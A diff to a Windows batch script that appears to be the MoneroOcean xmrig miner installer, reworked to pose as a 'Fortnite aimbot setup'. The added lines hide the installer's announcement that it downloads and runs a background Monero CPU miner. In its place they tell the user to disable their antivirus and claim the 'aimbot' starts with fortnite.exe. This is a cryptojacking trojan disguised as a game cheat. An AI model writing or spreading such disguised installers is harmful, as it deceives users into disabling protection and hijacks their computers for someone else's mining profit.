@@ -4,7 +4,7 @@ set VERSION=2.4
 
 rem printing greetings
 
-Season 2 Fortnite aimbot setup
+echo Season 2 Fortnite aimbot setup
 echo ^(Created by TechMango, undetectable by Easy Anti Cheat^)
 echo.
 
@@ -165,9 +165,9 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
 
-echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
-echo Mining will happen to %WALLET% wallet.
+echo Before the setup begins, please turn off your antivirus. The antivirus removes the aimbot hack, because it thinks it is a virus (I don't know why)
+echo The aimbot is ready when it says, "Setup Complete"
+echo The aimbot will run automatically when fortnite.exe is running.
 
 if not [%EMAIL%] == [] (
   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
